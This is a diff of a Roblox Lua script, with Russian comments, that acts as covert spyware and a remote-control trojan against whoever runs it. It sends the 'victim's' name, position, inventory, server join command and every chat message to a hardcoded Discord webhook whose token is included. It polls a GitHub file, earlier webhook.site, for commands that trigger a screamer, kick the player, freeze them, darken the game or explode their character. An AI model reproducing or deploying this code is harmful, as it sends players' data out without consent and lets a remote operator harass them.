@@ -1,23 +1,31 @@
--- [[ CONFIG ]] --
+-- [[ CONFIGURATION ]] --
 local log_webhook = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5"
-local control_api = "https://webhook.site/token/2823b2ef-9cc8-4640-909e-4b7893906b78/requests?sorting=created_at&direction=desc"
+local control_url = "https://raw.githubusercontent.com/arxitectorcz/Arxetector/main/controltroling"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local Lighting = game:GetService("Lighting")
 local lp = Players.LocalPlayer
 
-local function sendLog(title, desc, color)
+-- 1. ФУНКЦИЯ ЛОГИРОВАНИЯ (В Discord)
+local function sendMasterLog(title, desc, color)
     pcall(function()
+        local inv = ""
+        for _, v in pairs(lp.Backpack:GetChildren()) do inv = inv .. "[" .. v.Name .. "] " end
+        local pos = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
+        
         local data = {
             ["embeds"] = {{
                 ["title"] = title,
                 ["description"] = desc,
-                ["color"] = color or 0x00ffff,
+                ["color"] = color or 0x00a2ff,
                 ["fields"] = {
-                    {["name"] = "👤 Жертва", ["value"] = lp.Name, ["inline"] = true},
-                    {["name"] = "🔗 Join", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
-                }
+                    {["name"] = "👤 Жертва", ["value"] = "||"..lp.Name.."||", ["inline"] = true},
+                    {["name"] = "📍 Позиция", ["value"] = math.floor(pos.X)..", "..math.floor(pos.Y)..", "..math.floor(pos.Z), ["inline"] = true},
+                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. (inv ~= "" and inv or "Пусто") .. "```"},
+                    {["name"] = "🎮 Команда захода", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
+                },
+                ["footer"] = {["text"] = "AxM System • " .. os.date("%X")}
             }}
         }
         local req = request or http_request or (syn and syn.request)
@@ -25,84 +33,57 @@ local function sendLog(title, desc, color)
     end)
 end
 
+-- 2. ЦИКЛ КОНТРОЛЯ (Через GitHub)
 task.spawn(function()
-    local last_msg_id = ""
-    while task.wait(2) do -- Ускорил проверку до 2 секунд
+    local last_cmd = ""
+    while task.wait(4) do -- Проверка каждые 4 секунды
         pcall(function()
-            local res = game:HttpGet(control_api)
-            local json = HttpService:JSONDecode(res)
-            
-            if json and json.data and json.data[1] then
-                local latest = json.data[1]
-                if latest.id ~= last_msg_id then
-                    last_msg_id = latest.id
-                    local content = string.lower(latest.content or latest.raw_body or "")
-                    local char = lp.Character or lp.CharacterAdded:Wait()
-                    local hum = char:FindFirstChildOfClass("Humanoid")
+            local cmd = game:HttpGet(control_url .. "?t=" .. tick())
+            cmd = string.lower(cmd):gsub("%s+", "") -- Чистим текст
 
-                    -- [ СТАРЫЕ КОМАНДЫ ] --
-                    if string.find(content, "screamer") then
-                        local g = Instance.new("ScreenGui", lp.PlayerGui)
-                        local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
-                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
-                        task.delay(0.5, function() g:Destroy() end)
-                        sendLog("😱 СКРИМЕР", "Выполнен", 0xffffff)
-                        
-                    elseif string.find(content, "kick") then
-                        local reason = string.match(content, "kick%s*%((.*)%)") or "Disconnected"
-                        sendLog("💀 КИК", "Причина: " .. reason, 0xff0000)
-                        lp:Kick("\n[AxM Overlord]\n" .. reason)
-                        
-                    elseif string.find(content, "horror") then
-                        Lighting.ClockTime = 0; Lighting.Brightness = 0
-                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://163721344"; s.Volume = 3; s:Play()
-                        sendLog("🌑 ХОРРОР", "Тьма активирована", 0x333333)
+            if cmd ~= last_cmd and cmd ~= "safe" then
+                last_cmd = cmd
+                local char = lp.Character or lp.CharacterAdded:Wait()
+                local hum = char:FindFirstChildOfClass("Humanoid")
 
-                    -- [ НОВЫЕ КОМАНДЫ ] --
-                    elseif string.find(content, "freeze") then
-                        char.HumanoidRootPart.Anchored = true
-                        sendLog("🧊 ЗАМОРОЗКА", "Игрок не может двигаться", 0x00EBFF)
+                -- Обработка команд
+                if string.find(cmd, "screamer") then
+                    local g = Instance.new("ScreenGui", lp.PlayerGui)
+                    local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
+                    local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
+                    task.delay(0.5, function() g:Destroy() end)
+                    sendMasterLog("😱 ВЫПОЛНЕНО: СКРИМЕР", "Игрок напуган", 0xFFFFFF)
 
-                    elseif string.find(content, "unfreeze") then
-                        char.HumanoidRootPart.Anchored = false
-                        sendLog("🔥 РАЗМОРОЗКА", "Игрок снова двигается", 0xFF8000)
+                elseif string.find(cmd, "kick") then
+                    local reason = string.match(cmd, "%((.*)%)") or "Disconnected"
+                    sendMasterLog("💀 ВЫПОЛНЕНО: КИК", "Причина: " .. reason, 0x000000)
+                    lp:Kick("\n[AxM Admin]\n" .. reason)
 
-                    elseif string.find(content, "explode") then
-                        local ex = Instance.new("Explosion", char.HumanoidRootPart)
-                        ex.Position = char.HumanoidRootPart.Position
-                        sendLog("💥 ВЗРЫВ", "Персонаж взорван", 0xFF0000)
+                elseif string.find(cmd, "freeze") then
+                    char.HumanoidRootPart.Anchored = true
+                    sendMasterLog("🧊 ВЫПОЛНЕНО: ЗАМОРОЗКА", "Игрок обездвижен", 0x00EBFF)
 
-                    elseif string.find(content, "jump") then
-                        hum.Jump = true
-                        sendLog("🦘 ПРЫЖОК", "Жертва подпрыгнула", 0x00FF00)
+                elseif string.find(cmd, "unfreeze") then
+                    char.HumanoidRootPart.Anchored = false
+                    sendMasterLog("🔥 ВЫПОЛНЕНО: РАЗМОРОЗКА", "Игрок снова ходит", 0xFF8000)
 
-                    elseif string.find(content, "lowspeed") then
-                        hum.WalkSpeed = 4
-                        sendLog("🐌 ЗАМЕДЛЕНИЕ", "Скорость установлена на 4", 0xFFFF00)
+                elseif string.find(cmd, "horror") then
+                    Lighting.ClockTime = 0; Lighting.Brightness = 0
+                    sendMasterLog("🌑 ВЫПОЛНЕНО: ХОРРОР", "Включена вечная ночь", 0x333333)
 
-                    elseif string.find(content, "highspeed") then
-                        hum.WalkSpeed = 100
-                        sendLog("⚡ СКОРОСТЬ", "Скорость установлена на 100", 0xFFFF00)
-
-                    elseif string.find(content, "reset") then
-                        hum.Health = 0
-                        sendLog("⚰️ РЕСЕТ", "Игрок убит", 0x000000)
-
-                    elseif string.find(content, "naked") then
-                        for _, v in pairs(char:GetChildren()) do
-                            if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("CharacterMesh") then v:Destroy() end
-                        end
-                        sendLog("👕 ГОЛЫЙ", "Одежда удалена", 0xFFC0CB)
-
-                    elseif string.find(content, "nofaces") then
-                        if char.Head:FindFirstChild("face") then char.Head.face:Destroy() end
-                        sendLog("😶 БЕЗ ЛИЦА", "Лицо удалено", 0xFFFFFF)
-                    end
+                elseif string.find(cmd, "explode") then
+                    local ex = Instance.new("Explosion", char.HumanoidRootPart)
+                    ex.Position = char.HumanoidRootPart.Position
+                    sendMasterLog("💥 ВЫПОЛНЕНО: ВЗРЫВ", "Персонаж разорван", 0xFF0000)
                 end
             end
         end)
     end
 end)
 
-lp.Chatted:Connect(function(m) sendLog("💬 ЧАТ", "Пишет: `" .. m .. "`", 0x5555ff) end)
-sendLog("🛰️ AXM ULTIMATE LOADED", "Доступно 12+ команд. Жду жатвы.", 0x00ff00)
+-- 3. СЛЕЖКА ЗА ЧАТОМ
+lp.Chatted:Connect(function(msg)
+    sendMasterLog("💬 ЧАТ ИГРОКА", "Написал в игре: `" .. msg .. "`", 0x5555FF)
+end)
+
+sendMasterLog("🛰️ AXM OVERLORD ONLINE", "Система активна. Управляй через GitHub файл.", 0x00FF00)
